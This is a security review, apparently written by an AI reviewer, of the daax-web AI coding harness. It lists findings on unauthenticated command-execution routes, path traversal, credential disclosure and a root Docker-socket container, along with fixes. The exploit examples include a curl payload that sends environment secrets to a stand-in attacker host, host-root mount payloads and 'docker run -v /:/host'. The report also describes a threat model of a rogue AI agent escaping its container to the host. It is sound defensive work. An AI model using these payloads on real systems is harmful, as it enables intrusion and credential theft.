# Security Review — daax-web

**Reviewer:** Claude Fable 5
**Date:** 2026-07-03
**Scope:** Full repository. daax-web is a browser-based developer harness (integrated terminal, AI coding agents, code-server IDE, MCP tooling) that runs in two modes: **host-dev** (`bun dev`, loopback, auth bypassed by design) and **container / Tailscale** behind Traefik + Pocket ID (passkey) forward-auth.
**Method:** First-hand reading of the auth core, WS terminal server, ticket flow, proxies, and deployment config, plus five parallel deep-dive audits (route authz coverage, terminal/command-exec, proxy SSRF, filesystem/git/secrets, deployment/infra). Every claim cites `file:line`.

**Verification provenance:** All Critical and High findings (C1a–c, C2, C3, H1–H5) and M1 were re-read against source by the reviewer directly — not taken on an agent's word — per the operator's "validate against primary sources" rule. Medium/Low findings are a mix of first-hand and agent-reported; where a claim depends on a value not in this repo (Pocket ID cookie `SameSite`, Traefik static HSTS config), that is stated explicitly rather than assumed.

---

## 1. Executive Summary

The **perimeter and cryptographic design is strong and was clearly built with care.** Traefik strips inbound identity headers before injecting authenticated ones, the WS terminal uses single-use HMAC bearer tickets with constant-time verification and replay protection, the loopback trust decision reads the real TCP peer (not a spoofable header), and strict mode fails closed. These are done right and should not be regressed. See §5.

The problem is **not the perimeter — it is what sits behind it.** Authorization on the HTTP API is entirely manual and per-route: there is **no `middleware.ts` and no default-deny.** 89 of 133 API routes (67%) never call `requireAuth`. Most are benign reads, but the unauthenticated set includes **three arbitrary-command-execution sinks** (`mcp/tools`, `plugins/mcp-inspector`, and container-spawn via `code-server`), arbitrary host-path mounts, arbitrary-directory file writes, and plaintext credential disclosure. Because the app container **runs as root with the Docker socket mounted**, any one of these is a path to host root.

The Traefik main router gates *every* path through `daax.HOST.poley.dev` with Pocket ID, so in the fully-hardened deployment these routes are **not** reachable anonymously from the public front door. This is therefore a **defense-in-depth failure**, not a front-door bypass. It becomes a live, exploitable vulnerability in three realistic conditions:

1. **Sibling-container lateral movement (the defining risk for an *AI coding harness*, and it holds even in hardened Path A).** Containers on `daax-net` reach `daax:4200` directly, bypassing Traefik. This harness's entire purpose is to **spawn AI-agent containers that run untrusted, AI-generated code** on that same network. A compromised or adversarial agent → `POST /api/mcp/tools` → root in the app container → Docker socket → host root. No browser and no auth-bypass flag is required; this is the strongest vector.
2. **Proxy-less / `0.0.0.0` tailnet exposure.** The documented "container mode" path (`rebuild.sh` / root `docker-compose.yml`) publishes ports on `0.0.0.0`, and the HTTP `LOCAL_OPERATOR` bypass — unlike the WS plane — has **no loopback/peer check**. Any peer on the operator's tailnet who reaches `:4200` directly is treated as the trusted operator.
3. **Host-dev drive-by CSRF (primary/default mode).** No proxy, no auth, ports on `localhost`. A malicious web page the developer merely *visits* can `POST` to `http://localhost:4200/api/mcp/tools` as a CORS "simple request" (`Content-Type: text/plain`, no preflight). Next.js `request.json()` parses the body regardless of content type and there is no Origin/CSRF check, so the command spawns; the CORS-blocked response is irrelevant because the RCE side effect already fired. (Modern browsers' Private Network Access may blunt localhost-targeted requests from public pages depending on version/enforcement — treat this as a real but browser-dependent vector, not the load-bearing one.)

**Central synthesis:** the elaborate WS ticket + origin design is largely *mooted* by the unauthenticated HTTP RCE routes sitting next to it — an attacker never needs the terminal WebSocket. **Fix the HTTP authorization gap first.**

**The friction-aware fix** (directly answering the project goal): a single **default-deny `middleware.ts`** that enforces `requireAuth` + an Origin/CSRF check across `/api/*`, while **preserving the loopback `LOCAL_OPERATOR` bypass** so host-dev stays zero-friction. One file closes the systemic gap and the CSRF vector at once, and keeps the developer experience unchanged. See §6.

### Severity roll-up

Every finding below has a corresponding GitHub issue labeled `fable-review` in `daax-dev/daax-web`, with full exploitation detail, a fix scope, testable acceptance criteria, and required test coverage (unit/integration/E2E, both deployment modes).

| # | Severity | Finding | Primary exposure | Issue |
|---|----------|---------|------------------|-------|
| — | **Critical** | Architecture: add default-deny auth middleware for `/api/*` (root-cause fix for C1/C2 and the CSRF vector) | — | [#181](https://github.com/daax-dev/daax-web/issues/181) |
| C1 | **Critical** | No default-deny authz; unauth RCE via `mcp/tools`, `mcp-inspector` | host-dev CSRF · sibling container · proxy-less | [#182](https://github.com/daax-dev/daax-web/issues/182) |
| C1c | **Critical** | Unauth code-server container spawn with client-controlled host mount | same as C1 | [#183](https://github.com/daax-dev/daax-web/issues/183) |
| C2 | **Critical** | HTTP `LOCAL_OPERATOR` bypass has no peer check → tailnet operator on `0.0.0.0` deploys | proxy-less / dev-compose | [#184](https://github.com/daax-dev/daax-web/issues/184) |
| C3 | **Critical** | App container runs as **root** with Docker socket mounted (blast-radius multiplier) | any app RCE/SSRF → host root | [#185](https://github.com/daax-dev/daax-web/issues/185) |
| H1 | High | Mount confinement uses attacker-controlled `basePath` + lexical `startsWith` (terminal server) | authed / non-strict | [#186](https://github.com/daax-dev/daax-web/issues/186) |
| H2 | High | Unauthenticated arbitrary-directory file writes (`devcontainers/save-local`, `workflow-editor/*`) | same as C1 | [#187](https://github.com/daax-dev/daax-web/issues/187) |
| H3 | High | Unauthenticated plaintext credential disclosure (`clawd/token`) | direct / sibling / proxy-less | [#188](https://github.com/daax-dev/daax-web/issues/188) |
| H4 | High | `isValidPath` blocks `..` only, no base confinement → arbitrary host git repos (`git/status`, `git/worktree`) | same as C1 | [#189](https://github.com/daax-dev/daax-web/issues/189) |
| H5 | High | Arbitrary host-path bind mount via testcontainers `volumes[].source` | authed / non-strict | [#190](https://github.com/daax-dev/daax-web/issues/190) |
| M1 | Medium | Enforcement flags (`DAAX_REQUIRE_AUTH`, `DAAX_PROXY_SECRET`) default off, not `:?`-required; `DAAX_PROXY_SECRET` not wired into the app service | deployment | [#191](https://github.com/daax-dev/daax-web/issues/191) |
| M2 | Medium | No HTTP security headers (CSP / frame-ancestors / HSTS / nosniff) | all | [#192](https://github.com/daax-dev/daax-web/issues/192) |
| M3 | Medium | Recording `id` path traversal (read/delete `.json`/`.cast`) | terminal WS | [#193](https://github.com/daax-dev/daax-web/issues/193) |
| M4 | Medium | Unauthenticated bulk read of workspace `.jsonl` logs (`files`) | same as C1 | [#194](https://github.com/daax-dev/daax-web/issues/194) |
| M5 | Medium | Spawned agent containers mount host Claude/OpenCode creds; unpinned `:latest` force-pulled | agent compromise | [#195](https://github.com/daax-dev/daax-web/issues/195) |
| M6 | Medium | Weak default Postgres password (`daax`) in local compose | sibling container | [#196](https://github.com/daax-dev/daax-web/issues/196) |
| M7 | Medium | Unauthenticated registry/catalog/release state mutation | same as C1 | [#197](https://github.com/daax-dev/daax-web/issues/197) |
| L1 | Low | `.secrets.json` not excluded from `.gitignore`/`.dockerignore` | — | [#198](https://github.com/daax-dev/daax-web/issues/198) |
| L2 | Low | Unauthenticated info-disclosure debug routes | — | [#199](https://github.com/daax-dev/daax-web/issues/199) |
| L3 | Low | `bun` installed via unpinned/unverified `curl\|bash` | — | [#200](https://github.com/daax-dev/daax-web/issues/200) |
| L4 | Low | code-server runs with `--auth none`, no defense-in-depth | — | [#201](https://github.com/daax-dev/daax-web/issues/201) |
| L5 | Low | `clawd` Traefik route has no forward-auth middleware | — | [#202](https://github.com/daax-dev/daax-web/issues/202) |
| L6 | Low | Base images tag-pinned instead of digest-pinned | — | [#203](https://github.com/daax-dev/daax-web/issues/203) |

---

## 2. Deployment Trust Model (as implemented)

There are **two deploy paths with very different exposure** — conflating them hides the risk.

**Path A — `deploy/docker-compose.yml` + `deploy-local.sh` + Traefik (intended production).** App/terminal/code-server ports bound to `127.0.0.1` only (`deploy/docker-compose.yml:74-75,198`). Traefik is the sole ingress, TLS-terminated (`certResolver: cloudflare`). Forward-auth is **correctly ordered**: `strip-forwarded-headers` → `pocket-id-auth` → `inject-proxy-secret` (`deploy/traefik-daax.yml.tpl:76-79`) — client `X-Forwarded-*`/`X-Daax-Proxy-Secret` are stripped before Pocket ID injects the real ones. The main router `Host(daax.…)` (no path constraint) applies `pocket-id-auth`, so **all** paths are gated at the edge. This path is reasonably safe *by default* — but its safety rests entirely on the edge, because the app behind it has no second authorization layer (C1).

**Path B — `rebuild.sh` + root `docker-compose.yml` ("container mode" in CLAUDE.md, used to deploy `daax.galway`).** Ports published on **`0.0.0.0`**: `-p 4200:4200 -p 4201:4201` (`docker-compose.yml:67-69`, `rebuild.sh:72-73`). On a tailnet host the app is directly reachable at `http://<tailscale-ip>:4200`, **bypassing Traefik entirely**. This path carries C2.

The whole posture hinges on two flags — `DAAX_REQUIRE_AUTH=1` and `DAAX_PROXY_SECRET` — that turn HTTP identity enforcement on. **Neither is `:?`-enforced in any compose file; both default off/empty** (`docker-compose.yml:102`, `deploy/docker-compose.yml:117`). The composes *do* `:?`-enforce `DAAX_WS_TOKEN_SECRET` — but that gates the terminal WS, not the HTTP plane. A plain `docker compose up` / `./rebuild.sh` yields a running system in the fully-bypassed posture, signalled only by a one-time `console.warn` (M1).

---

## 3. Findings

### CRITICAL

#### C1 — No default-deny authorization; three unauthenticated remote-code-execution sinks
**Root cause:** no `middleware.ts` anywhere; auth is per-route via `requireAuth()` (`lib/auth.ts:274`). 89/133 routes never call it (§7). Three of them execute attacker-controlled processes.

- **C1a — `app/api/mcp/tools/route.ts:193`** (POST, no auth). Sink at `:38`:
  ```ts
  const proc = spawn(command, args, { env: { ...process.env, ...env }, stdio: [...] });
  //   command = config.command, args = config.args, env = config.env  (all from request body)
  ```
  `spawn` uses an argv array (no shell), but the *command itself* is attacker-chosen. Exploit:
  ```
  POST /api/mcp/tools
  {"mcpId":"x","config":{"command":"/bin/sh","args":["-c","curl http://attacker/$(cat /proc/1/environ|base64)"]}}
  ```
  → arbitrary execution as the app user, which holds `GITHUB_TOKEN`, `CLAWD_GATEWAY_TOKEN`, `DAAX_WS_TOKEN_SECRET`, `DATABASE_URL`, and (C3) the Docker socket. The HTTP branch `fetchToolsViaHttp(config.url)` (`:144,207`) is additionally an **unauthenticated SSRF** — server-side `fetch` to any client URL (e.g. `169.254.169.254`, internal services).

- **C1b — `app/api/plugins/mcp-inspector/route.ts:45`** (POST, no auth). Sink at `:93`:
  ```ts
  const inspectorProcess = spawn("npx", ["@modelcontextprotocol/inspector", command, ...args], { env: {...process.env, ...env} });
  ```
  `npx @modelcontextprotocol/inspector <command>` runs `<command>` as the child → arbitrary execution, same exposure as C1a.

- **C1c — `app/api/code-server/route.ts:225`** (POST, no auth). Spawns a code-server container (`:351`) with a workspace bind-mount, `--auth none --bind-addr 0.0.0.0:8080` (`:341-344`) on a client-chosen host port (`:230,331`). In **host-dev mode** the containment base is self-referential (see H1), so `{"action":"start","basePath":"/","project":"etc"}` yields `-v /etc:/workspace` → a full in-browser VS Code + integrated terminal over host files.

**Exposure (all three):** not reachable anonymously through hardened Path A's front door (Traefik gates it), **but** exploitable via (1) **any sibling container on `daax-net`, including spawned AI-agent containers** — needs no browser and holds even in hardened Path A (container-to-container hits `daax:4200`, bypassing Traefik); (2) proxy-less/`0.0.0.0` tailnet peers (C2); (3) host-dev drive-by CSRF — confirmed no Origin/CSRF check on these POST routes and `request.json()` parses any content type. **Note:** even in hardened Path A, an *already-authenticated* operator whose browser visits a malicious page can be CSRF-driven into these routes (Traefik's ForwardAuth passes on the operator's Pocket ID cookie, then injects the trusted headers) — severity depends on the Pocket ID cookie's `SameSite` setting, which is outside this repo; verify it.

**Fix:** default-deny middleware (§6). Additionally, `mcp/tools` and `mcp-inspector` should never accept a caller-supplied `command`/`env` — restrict to a server-side allowlist derived from the registered MCP config.

#### C2 — HTTP `LOCAL_OPERATOR` bypass has no peer-address check
**`lib/auth.ts:285-288`, `:332-335`.** The bypass fires whenever `X-Forwarded-User` is absent and `DAAX_REQUIRE_AUTH!=1` — with **no loopback guard**, unlike the WS plane which requires a loopback TCP peer (`server/handlers/ws-auth.ts:119,149`). On Path B (`0.0.0.0` bind, non-strict default), any tailnet peer who reaches `:4200` directly is the trusted operator, chaining straight into C1/C3. Exposure is the operator's whole tailnet, not just the operator.
**Fix:** gate the HTTP bypass on a loopback peer too (mirror `isLoopbackAddress`), or make strict mode the default.

#### C3 — App container runs as root with the Docker socket mounted
**`Dockerfile:170` (no `USER`; comment "Running as root for Docker socket access"); socket mount `docker-compose.yml:76`, `deploy/docker-compose.yml:79`.** Any RCE or SSRF in the app is immediately host-root: `/var/run/docker.sock` + uid 0 = full control of the host daemon (`docker run -v /:/host …`). The deploy compose's `group_add: DOCKER_GID` (`deploy/docker-compose.yml:160`) is defeated by the missing `USER` — the process is uid 0 regardless. No `read_only` rootfs, no `cap_drop`, no `security_opt: no-new-privileges`. This is the multiplier that turns every other RCE/mount finding into host compromise.
**Fix:** run the app as a non-root user in the `docker` group; add `no-new-privileges`, `cap_drop: [ALL]`, and a read-only rootfs where feasible. Longer term, front the socket with a scoped proxy (e.g. tecnativa/docker-socket-proxy) exposing only the needed endpoints.

### HIGH

#### H1 — Mount confinement bypass (attacker-controlled base + lexical prefix)
**`app/api/code-server/route.ts:306-307` and `server/handlers/connection-handler.ts:148-149`.** Both check `path.startsWith(securityBasePath)` where, in host mode, `securityBasePath = expandPath(basePath)` — the *same client-controlled value* that drives the mount. `basePath=/` makes every path pass. Even in container mode (base pinned to `HOST_WORKSPACE_PATH`), the check is a lexical `startsWith` with **no trailing separator and no `realpath`**, so `/home/u/prj` also matches sibling `/home/u/prj-secrets/…`, and planted symlinks are followed. The `..`/`//` guard does not help — no traversal is needed.
**Fix:** derive the base from server config only; `realpath`-canonicalize and compare with a trailing-separator boundary (`resolved === base || resolved.startsWith(base + sep)`).

#### H2 — Unauthenticated arbitrary-directory file writes
- **`app/api/devcontainers/save-local/route.ts`** (no auth): `project` is joined into the workspace root with no traversal check (only `name` is sanitized) → `project:"../../.."` escapes; writes attacker-controlled content to `<dir>/.devcontainer/devcontainer.json`.
- **`app/api/workflow-editor/save/route.ts:25,58`** (no auth): `projectPath` is only `~`-expanded, then `fs.writeFile(join(expandPath(projectPath),"flowspec_workflow.yml"), yamlContent)` → attacker content into any writable dir. Same primitive in `workflow-editor/agents`, `workflow-editor/prompts`, `workflow-editor/skills` (PUT).

Filenames are fixed, but writing attacker content into arbitrary repos/config dirs is a supply-chain and persistence vector. Sibling routes `devcontainers/save|push-config|create-repo` *do* call `requireAuth` — these are the misses.

#### H3 — Unauthenticated gateway credential disclosure
**`app/api/clawd/token/route.ts:25`** (GET, no auth) returns `{ url, token }` from `CLAWD_GATEWAY_URL`/`CLAWD_GATEWAY_TOKEN`. The route's own comment assumes network-level auth that per-route bypass defeats. *Not* drive-by (CORS blocks a cross-origin page from reading the response body), but any direct / sibling-container / proxy-less caller retrieves a live gateway bearer token.

#### H4 — `isValidPath` permits arbitrary absolute paths
**`lib/worktree-manager.ts:26`** rejects `..` and NUL but its `basePath` param is optional and every caller omits it, so any absolute path passes.
- `app/api/git/status/route.ts` (no auth): `?path=/root` runs `git` in any host directory → recon of arbitrary repos.
- `app/api/git/worktree/route.ts` (auth, bypassed by default): `projectPath` may be any repo → create branches in and push from repos never meant to be touched.

#### H5 — Arbitrary host-path bind mount (testcontainers)
**`plugins/testcontainers/lib/docker-client.ts:291`**, reached from `app/api/testcontainers/route.ts` (auth present, bypassed by default in non-strict). `request.volumes[].source` becomes a Docker `Bind` with no validation → `{"volumes":[{"source":"/","target":"/host"}]}` mounts host root RW, or mounts `docker.sock` for trivial escape. `image` is also unvalidated here (unlike `docker/pull`).

### MEDIUM

- **M1 — Identity-enforcement flags default off; `DAAX_PROXY_SECRET` not wired to the app.** `DAAX_REQUIRE_AUTH` and `DAAX_PROXY_SECRET` are optional with off/empty defaults (`docker-compose.yml:102`, `deploy/docker-compose.yml:117`). Worse, **`DAAX_PROXY_SECRET` is not passed to the app service in either compose file** — yet `traefik-daax.yml.tpl` injects `X-Daax-Proxy-Secret`. Consequence: with strict mode **off**, the F1a proxy-secret trust boundary is inert; if an operator turns strict mode **on** without also providing `DAAX_PROXY_SECRET` to the app, `auth.ts` fails closed (`:187-190`) and **refuses all forwarded identity — login breaks entirely.** Confirmed first-hand: the deploy app service uses inline `environment:` blocks (no `env_file:`), and that block does not list `DAAX_PROXY_SECRET` — so even if `deploy-local.sh` exports the variable into the shell, it is not interpolated into the app container. Fix: add `- DAAX_PROXY_SECRET=${DAAX_PROXY_SECRET:?...}` to the app service.
- **M2 — No HTTP security headers.** `next.config.ts` sets no `headers()`, no CSP, no `X-Frame-Options`/`frame-ancestors`, no `X-Content-Type-Options`, no `poweredByHeader:false`. The app embeds the code-server iframe and is itself fully frameable → clickjacking of a console with destructive actions; any XSS is unconstrained. (HSTS lives in Traefik static config, not in this repo — verify at the proxy.)
- **M3 — Recording `id` path traversal.** `server/recording/recorder.ts:286-323` interpolates the WS-message `id` into `join(RECORDINGS_DIR, \`${id}.json\`)` / `.cast` with no validation; `deleteRecording` `unlinkSync`s both. `id="../../../…/x"` deletes/reads arbitrary `.json`/`.cast` files (terminal server is root in container mode). Fix: validate `id` against `^[A-Za-z0-9_-]+$`.
- **M4 — Unauthenticated bulk log read.** `app/api/files/route.ts:178` recursively reads every `.jsonl` under the workspace (depth 10) and returns full content; the default (no `projectFilter`) dumps all decision/session logs — which routinely contain tokens and prompts — to any caller.
- **M5 — Agent containers mount host creds + unpinned image.** `server/handlers/connection-handler.ts:595-597` mounts the host's real `~/.claude` (and OpenCode) auth into every agent container; the image is `jpoley/daax-agents:latest` (`server/config/constants.ts:20`), force-pulled from Docker Hub each deploy (`scripts/refresh-agent-images.sh`). Untrusted agent code can exfiltrate the mounted Claude/OpenCode tokens; a typosquat/registry-compromise of the unpinned tag lands arbitrary code. (Positive: agent containers are non-root, no socket, not privileged.)
- **M6 — Weak default Postgres password.** `docker-compose.yml:17,48` defaults `DAAX_PG_PASSWORD` to `daax`. PG is bound `127.0.0.1:5432`, but sibling containers on `daax-net` (incl. agents) reach `postgres:5432` with `daax:daax`. Deploy compose correctly `:?`-enforces it.
- **M7 — Unauthenticated state mutation.** No-auth writes across `mcp` (add/update/delete), `mcp/gateway` (updateConfig), `api-tools/templates`, `catalog/builds[/id][/start]`, `releases/[id]`, plus resource-abuse triggers `docker/pull` and `releases/[id]/build` (`docker build`). Individually low-impact, collectively a large unauthenticated write surface.

### LOW / INFORMATIONAL

- **L1 — `.secrets.json` not ignored.** `lib/secrets.ts:10` writes plaintext GitHub tokens to `process.cwd()/.secrets.json`; the code comment claims it is gitignored but it is in neither `.gitignore` nor `.dockerignore` (only `.env*` are). Commit/build-context risk. (Also: writing to `/app`, not a volume, loses secrets each redeploy — a functional bug.)
- **L2 — Info-disclosure debug routes.** `app/api/settings/debug` and `app/api/debug/workspace` (no auth) return `HOME`/`USER`/`PWD`/`HOST_WORKSPACE_PATH`; `test-path`, `workspace`, `containers`, `docker/images` similarly aid the traversal/mount attacks.
- **L3 — `bun` installed via `curl -fsSL https://bun.sh/install | bash`** (`Dockerfile:48`), unpinned/unverified — inconsistent with the same build's checksum-verified syft and Go.
- **L4 — code-server `--auth none`** (`deploy/docker-compose.yml:206`) relies entirely on Traefik; no defense-in-depth if `:18080` is ever reached directly.
- **L5 — `clawd` Traefik route has no `pocket-id-auth`** (`deploy/traefik-daax.yml.tpl:98`) — intentional (gateway has its own token) but means the Pocket ID boundary doesn't cover that host; verify the token is strong and required.
- **L6 — Base images tag-pinned, not digest-pinned** (`node:22-bookworm-slim`, `postgres:18-alpine`, `traefik/whoami`) — mutable-tag drift. (code-server base is version-pinned.)

---

## 4. Residual / verified-safe (checked, not vulnerable)

- **CSWSH / WS origin validation is sound.** `authenticateConnection` rejects a missing Origin and any non-allowlisted origin (`server/handlers/ws-auth.ts:107`, `server/config/constants.ts:59`); remote `evil.com` and DNS-rebinding are blocked (Origin reflects the page origin, not the rebound IP). Residual: any *localhost-origin* page in non-strict host-dev can open the WS (M-class, local-only).
- **Loopback determination is not spoofable** — reads the real `req.socket.remoteAddress`; `X-Forwarded-For` is never consulted (`ws-auth.ts:60`).
- **WS ticket HMAC** — constant-time compare with length pre-check, HMAC over the exact base64url payload, expiry enforced, token carried in `Sec-WebSocket-Protocol` not the URL (`lib/ws-ticket.ts`).
- **Traefik header stripping** — client `X-Forwarded-*`/`X-Daax-Proxy-Secret` stripped before injection; no smuggling through the proxy.
- **Command-injection in the docker/PTY path is avoided** — `spawn`/`execFile` use argv arrays (no shell); `FALCON_*` values reach the container as `-e VAR=val` and are referenced via `$FALCON_DISPLAY_PATH`, never interpolated into `zsh -c`. Image names are regex-validated.
- **Provenance/watchtower proxies are not SSRF** — upstream host is a fixed env var; client input only appends path segments (a limited same-host path-confusion, LOW), and inbound headers are not forwarded.
- **Spawned agent containers** are non-root, no socket, not privileged.
- `mode=local` → host `/bin/zsh` is a real shell on **host-dev**, but *latent in container mode* — the app image ships no `zsh`/`tmux` (`Dockerfile`), so that specific PTY escape fails there (the HTTP RCE routes remain the container-mode path to the socket).

---

## 5. What is done well (do not regress)

- Correct Traefik middleware order (strip → verify → inject) with the proxy-secret trust boundary and rotation support (`DAAX_PROXY_SECRET_PREVIOUS`).
- Constant-time secret and ticket comparisons; fail-closed strict mode; present-but-empty `X-Forwarded-User` treated as a malformed credential (not a bypass).
- Single-use HMAC WS tickets with jti replay tracking, short TTL, loopback-gated forwarded identity.
- Git operations use `execFile` argv arrays throughout; `isValidBranchName` is a solid allowlist blocking `-flag` and metacharacter injection.
- Docker image-name validation; `docker/pull` validates before pulling.
- Deploy path binds ports to `127.0.0.1`; `deploy-local.sh` renders the Traefik secret at `0600/0640` and rejects newlined secrets; syft/Go downloads are checksum-verified.

---

## 6. Project-Level Recommendations (secure without heavy friction)

The goal is a **secure AI harness with minimal security friction.** These are ordered by leverage; the first is the single highest-value change.

1. **One default-deny `middleware.ts` (closes C1, C2, and the CSRF vector at once, zero host-dev friction).** Enforce, for every `/api/*` request: (a) `requireAuth`, reusing the existing loopback `LOCAL_OPERATOR` logic so host-dev keeps working with no login; **but move the bypass behind a loopback-peer check** so it cannot fire for a non-loopback tailnet client (fixes C2); (b) an **Origin/`Sec-Fetch-Site` check on all state-changing methods** (reject cross-site `POST/PUT/PATCH/DELETE`), which neutralizes the drive-by CSRF chain without affecting same-origin app use. This is a handful of lines and leaves the developer experience unchanged.
2. **Drop app-container root privilege (C3).** Add a `USER` in the `docker` group, `security_opt: [no-new-privileges:true]`, `cap_drop: [ALL]`. Consider a scoped docker-socket proxy so a future app compromise cannot run arbitrary `docker run -v /:/host`.
3. **Make the secure posture the default, not an opt-in flag (M1).** Either default `DAAX_REQUIRE_AUTH=1` (with host-dev detecting loopback and relaxing automatically), or `:?`-require it and `DAAX_PROXY_SECRET` in the deploy compose, and **wire `DAAX_PROXY_SECRET` into the app service** so strict mode doesn't brick login. A misconfigured deploy should fail to start, not silently run wide open.
4. **Never accept caller-supplied `command`/`env` for MCP spawning (C1a/C1b).** Resolve the command server-side from the registered MCP config; the client sends only an MCP id.
5. **A single `confinePath(base, userPath)` helper** (`realpath` + trailing-separator boundary), used at every fs/mount call site, replacing the scattered `startsWith`/`..` checks (fixes H1, H2, H4, H5, M3). Make `basePath` a server constant, never a request field.
6. **Add security headers via the same middleware (M2):** a strict `Content-Security-Policy`, `frame-ancestors 'none'` (or the code-server origin only), `X-Content-Type-Options: nosniff`, `Referrer-Policy`, and `poweredByHeader:false`.
7. **Reduce agent-container credential blast radius (M5):** mount short-lived/scoped tokens instead of the host's real `~/.claude`; digest-pin the agents image.
8. **Housekeeping:** add `.secrets.json` to `.gitignore` **and** `.dockerignore` and store it on a volume; `:?`-require `DAAX_PG_PASSWORD` in the local compose or drop the `daax` default; checksum-pin the `bun` install; digest-pin base images.

**Process note (per repo workflow):** these are findings, not applied changes. Fixes 1–3 are the ship-blockers; the rest are defense-in-depth. A validation pass by a separate model is recommended before any remediation PR merges.

---

## 7. Appendix — API route authorization coverage

133 routes; **89 have no `requireAuth`**. Verdicts: **GUARDED** = all methods authed; **PARTIAL** = writes authed, GET open; **UNAUTH** = no auth. Dangerous unauth routes in **bold**.

| Route | Methods | Verdict | Notes |
|---|---|---|---|
| **mcp/tools** | POST | **UNAUTH** | spawn arbitrary command (C1a) |
| **plugins/mcp-inspector** | GET,POST,DELETE | **UNAUTH** | spawn npx + arbitrary command (C1b) |
| **code-server** | GET,POST | **UNAUTH** | spawn container + host mount (C1c) |
| **clawd/token** | GET | **UNAUTH** | returns gateway token (H3) |
| **devcontainers/save-local** | POST | **UNAUTH** | traversal file write (H2) |
| **workflow-editor/save·agents·prompts·skills** | POST,PUT | **UNAUTH** | arbitrary-dir file write (H2) |
| **git/status** | GET | **UNAUTH** | git in arbitrary path (H4) |
| **files** | GET | **UNAUTH** | bulk `.jsonl` read (M4) |
| **devcontainer** | GET,POST | **UNAUTH** | writes CI workflow files |
| **docker/pull** | POST | **UNAUTH** | `docker pull` (validated name) |
| **releases/[id]/build** | POST | **UNAUTH** | `docker build` |
| **releases/[id]** | GET,PUT,DELETE | **UNAUTH** | update/delete release (M7) |
| **containers** | GET | **UNAUTH** | `docker ps` |
| **mcp · mcp/[id] · mcp/gateway[/id][/bulk] · mcp/submit** | GET,POST,PATCH,DELETE | **UNAUTH** | registry writes (M7) |
| **catalog/builds[/id][/start]** | POST,PUT,DELETE | **UNAUTH** | build-spec writes (M7) |
| **api-tools/templates** | GET,POST,DELETE | **UNAUTH** | template store writes (M7) |
| **settings/debug · debug/workspace · test-path · workspace** | GET | **UNAUTH** | env/path disclosure (L2) |
| terminal-recordings/[id]/export·publish | GET,POST | UNAUTH | git exec + repo write |
| ai/active-sessions | GET | UNAUTH | docker exec (list) |
| backlog/* (config, docs, drafts, status, …) | mixed | UNAUTH | file/DB reads + some writes |
| catalog/* (bases, features, images, dashboard, sbom reads) | GET | UNAUTH | reads |
| cyber/safe-mcp/* | GET,POST | UNAUTH | static ref data / regex scan |
| transcripts[/id] · terminal-recordings[/id] · devcontainers/list · docker/images · vite-allowed-hosts · config · auth/user · branding/logos · health[/backlog] · api-tools/tests/* | GET | UNAUTH | reads / mocks / by-design public |
| git/worktree · releases · ai/sessions/[id] · terminal-recordings/[id] · workflow-editor/create | mixed | PARTIAL | writes guarded, GET open |
| **GUARDED** (call `requireAuth`): terminal/ticket, secrets, mcp/config, api-tools/credentials, ai/sessions, ai/active-sessions/[name]·reap, containers/[id]/*, testcontainers/* (control), build[/images][/sbom], devcontainers/create-repo·push-config·save, provenance-admin/*, watchtower/*, backlog/tasks[/id], terminal-recordings/[id]/create-pr | | GUARDED | correct pattern |

Only `health` is intentionally public and documented as such. The root cause of every UNAUTH row is the same: per-method manual guarding with no default-deny — a single forgotten `requireAuth` ships a route wide open.
